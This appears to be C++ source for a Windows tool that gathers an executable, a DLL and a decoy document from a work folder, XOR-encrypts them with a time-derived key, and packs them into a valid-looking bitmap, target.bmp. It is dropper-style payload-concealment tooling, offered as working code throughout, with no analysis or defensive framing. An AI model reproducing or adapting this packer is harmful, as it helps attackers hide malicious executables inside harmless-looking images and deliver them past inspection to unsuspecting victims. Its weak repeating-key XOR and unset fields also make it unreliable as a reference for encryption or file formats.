#include <Windows.h>
#include <iostream>

//#include "..\\Config.h"

#include <string>

using namespace std;


#define OPEN_FILE_TYPE_BMP		".bmp"
#define OPEN_FILE_TYPE_DOC		".doc"
#define OPEN_FILE_TYPE_PDF		".pdf"
#define OPEN_FILE_TYPE_TXT		".txt"
#define OPEN_FILE_TYPE_MOVIE	".mp4"
#define OPEN_FILE_TYPE_MUSIC	".mp3"


//#define OPEN_FILE_TYPE		OPEN_FILE_TYPE_BMP
#define OPEN_FILE_TYPE		OPEN_FILE_TYPE_DOC
//#define OPEN_FILE_TYPE		OPEN_FILE_TYPE_PDF
//#define OPEN_FILE_TYPE		OPEN_FILE_TYPE_TXT
//#define OPEN_FILE_TYPE		OPEN_FILE_TYPE_MOVIE
//#define OPEN_FILE_TYPE		OPEN_FILE_TYPE_MUSIC


#define OUTPUT_FILE_NAME		"target.bmp"
#define WORK_PATH				"workpath\\"
#define CRYPT_KEY_SIZE			16
#define DEFAULT_BMP_WIDTH		1024
#define DEFAULT_BMP_BITCOUNT	32




#pragma pack(1)

typedef struct{
	int openfiletype;
	int openfnlen;
	char openfilename[256];
	int openfilelen;
	int exefnlen;
	char exefilename[256];
	int exelen;
	int dllfnlen;
	char dllfilename[256];
	int dlllen;
	unsigned char key[16];
}BMPEMBEDDEDFILEINFO,*LPBMPEMBEDDEDFILEINFO;
#pragma pack()

int FindFormatFile(const char * szcurdir,const char * szallexeformat,char * szexepath,char * exename){

	WIN32_FIND_DATAA stfd = {0};

	char szfindexepath[MAX_PATH];
	lstrcpyA(szfindexepath,szcurdir);
	lstrcatA(szfindexepath,szallexeformat);
	HANDLE hfind = FindFirstFileA(szfindexepath,&stfd);
	if (hfind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	FindClose(hfind);

	lstrcpyA(exename,stfd.cFileName);
	lstrcpyA(szexepath,szcurdir);
	lstrcatA(szexepath,stfd.cFileName);
	return TRUE;
}


DWORD GetCryptKey(unsigned char * pKey)
{
	SYSTEMTIME stSystime = {0};
	GetSystemTime(&stSystime);
	srand(GetTickCount());

	DWORD dwTickCnt[CRYPT_KEY_SIZE/sizeof(DWORD)] = {0};
	for (int i= 0; i < CRYPT_KEY_SIZE/sizeof(DWORD); i ++)
	{
		int randno = rand();
		dwTickCnt[i] = GetTickCount()* randno;
	}

	unsigned char * pSystemTime = (unsigned char*)&stSystime;
	unsigned char * pTickCnt = (unsigned char*)dwTickCnt;
	for (int j = 0 ; j < CRYPT_KEY_SIZE; j ++)
	{
		pKey[j] = pSystemTime[j] ^ pTickCnt[j];
	}

	for (int i = 0; i <CRYPT_KEY_SIZE; i ++ )
	{
		if (pKey[i] >= 0x80)
		{
			pKey[i] = pKey[i] - 0x80;
		}
	}
	return TRUE;
}


void CryptData(unsigned char * pdata,int size,unsigned char * pkey,int keylen){

	for(int i = 0,j = 0; i < size ;)
	{
		pdata[i] ^= pkey[j];
		j ++;
		if (j == keylen)
		{
			j = 0; 
		}
		i ++;
	}
}


int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow){
	if (DEFAULT_BMP_WIDTH%4)
	{
		MessageBoxA(0,"DEFAULT_BMP_WIDTH error","DEFAULT_BMP_WIDTH error",MB_OK);
		return FALSE;
	}
	if (DEFAULT_BMP_BITCOUNT%8)
	{
		MessageBoxA(0,"DEFAULT_BMP_BITCOUNT error","DEFAULT_BMP_BITCOUNT error",MB_OK);
		return FALSE;
	}
	

	char szcurdir[MAX_PATH];
	int ret = GetCurrentDirectoryA(MAX_PATH,szcurdir);
	lstrcatA(szcurdir,"\\");
	lstrcatA(szcurdir,WORK_PATH);

	char szallexeformat[] = "*.exe";
	char szexepath[MAX_PATH];
	char szexename[MAX_PATH];
	ret = FindFormatFile(szcurdir,szallexeformat,szexepath,szexename);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char szalldllformat[] = "*.dll";
	char szdllpath[MAX_PATH];
	char szdllname[MAX_PATH];
	ret = FindFormatFile(szcurdir,szalldllformat,szdllpath,szdllname);
	if (ret == FALSE)
	{
		return FALSE;
	}


	string szallopenformat = "*" + string(OPEN_FILE_TYPE);
	char szopenfpath[MAX_PATH];
	char szopenfname[MAX_PATH];
	ret = FindFormatFile(szcurdir, szallopenformat.c_str(), szopenfpath, szopenfname);
	if (ret == FALSE)
	{
		return FALSE;
	}


	HANDLE hfopen = CreateFileA(szopenfpath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hfopen == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int openfilesize = GetFileSize(hfopen, 0);
	

	HANDLE hfexe = CreateFileA(szexepath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (hfexe == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	int exefilesize = GetFileSize(hfexe,0);

	HANDLE hfdll = CreateFileA(szdllpath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (hfdll == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hfexe);
		return FALSE;
	}
	int dllfilesize = GetFileSize(hfdll,0);


	int bmpdatasize = sizeof(BMPEMBEDDEDFILEINFO) + openfilesize + exefilesize + dllfilesize ;
	char * bmpdata = new char [bmpdatasize];
	LPBMPEMBEDDEDFILEINFO lpembedded = (LPBMPEMBEDDEDFILEINFO)bmpdata;
	GetCryptKey(lpembedded->key);
	lpembedded->openfnlen = lstrlenA(szopenfname);
	lpembedded->exefnlen = lstrlenA(szexename);
	lpembedded->dllfnlen = lstrlenA(szdllname);
	lpembedded->dlllen = dllfilesize;
	lpembedded->exelen = exefilesize;
	lpembedded->openfilelen = openfilesize;
	lstrcpyA(lpembedded->exefilename,szexename);
	CryptData((unsigned char*)(lpembedded->exefilename), lstrlenA(lpembedded->exefilename), lpembedded->key, CRYPT_KEY_SIZE);
	lstrcpyA(lpembedded->dllfilename,szdllname);
	CryptData((unsigned char*)(lpembedded->dllfilename), lstrlenA(lpembedded->dllfilename), lpembedded->key, CRYPT_KEY_SIZE);
	lstrcpyA(lpembedded->openfilename, szopenfname);
	CryptData((unsigned char*)(lpembedded->openfilename), lstrlenA(lpembedded->openfilename), lpembedded->key, CRYPT_KEY_SIZE);

	
	DWORD dwcnt = 0;
	int offset = sizeof(BMPEMBEDDEDFILEINFO);
	ret = ReadFile(hfopen, bmpdata + offset, openfilesize, &dwcnt, 0);
	CloseHandle(hfopen);
	if (ret == FALSE || dwcnt != openfilesize)
	{
		CloseHandle(hfexe);
		CloseHandle(hfdll);
		delete[] bmpdata;
		return FALSE;
	}
	CryptData((unsigned char*)bmpdata + offset, openfilesize, lpembedded->key, CRYPT_KEY_SIZE);
	offset += openfilesize;


	ret = ReadFile(hfexe,bmpdata + offset,exefilesize,&dwcnt,0);
	CloseHandle(hfexe);
	if (ret == FALSE || dwcnt != exefilesize)
	{
		CloseHandle(hfdll);
		delete [] bmpdata;
		return FALSE;
	}
	CryptData((unsigned char*)bmpdata + offset,exefilesize,lpembedded->key,CRYPT_KEY_SIZE);


	offset += exefilesize;
	ret = ReadFile(hfdll,bmpdata + offset,dllfilesize,&dwcnt,0);
	CloseHandle(hfdll);
	if (ret == FALSE || dwcnt != dllfilesize)
	{
		delete [] bmpdata;
		return FALSE;
	}

	CryptData((unsigned char*)bmpdata + offset,dllfilesize,lpembedded->key,CRYPT_KEY_SIZE);

	int bytesperline = DEFAULT_BMP_WIDTH*(DEFAULT_BMP_BITCOUNT / 8);
	int modsize = bmpdatasize % bytesperline;
	int bmpheight = bmpdatasize/ bytesperline;
	int additionpixelsize = 0;
	if (modsize)
	{
		additionpixelsize = bytesperline - modsize;
		//bmpdatasize = bmpdatasize + modpixelsize;
		bmpheight ++;
	}

	BITMAPFILEHEADER bmphdr = {0};
	bmphdr.bfType = 0x4d42;
	bmphdr.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpdatasize + additionpixelsize;
	bmphdr.bfOffBits = 54;

	BITMAPINFOHEADER bmpinfohdr = {0};
	bmpinfohdr.biSize = sizeof(BITMAPINFOHEADER);
	bmpinfohdr.biBitCount = DEFAULT_BMP_BITCOUNT;
	bmpinfohdr.biPlanes = 1;
	bmpinfohdr.biCompression = 0;
	bmpinfohdr.biWidth = DEFAULT_BMP_WIDTH;
	bmpinfohdr.biHeight = bmpheight;
	bmpinfohdr.biSizeImage = bmpdatasize + additionpixelsize;
	
	char szoutfilename[MAX_PATH];
	lstrcpyA(szoutfilename,szcurdir);
	lstrcatA(szoutfilename,OUTPUT_FILE_NAME);
	HANDLE hfout = CreateFileA(szoutfilename,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (hfout == INVALID_HANDLE_VALUE)
	{
		delete [] bmpdata;
		return FALSE;
	}

	ret = WriteFile(hfout,&bmphdr,sizeof(BITMAPFILEHEADER),&dwcnt,0);
	ret = WriteFile(hfout,&bmpinfohdr,sizeof(BITMAPINFOHEADER),&dwcnt,0);
	ret = WriteFile(hfout,bmpdata,bmpdatasize,&dwcnt,0);
	delete[]bmpdata;

	char * lpmodpixelbuf = new char[additionpixelsize];
	ret = WriteFile(hfout,lpmodpixelbuf,additionpixelsize,&dwcnt,0);
	delete[]lpmodpixelbuf;
	CloseHandle(hfout);
	return TRUE;
}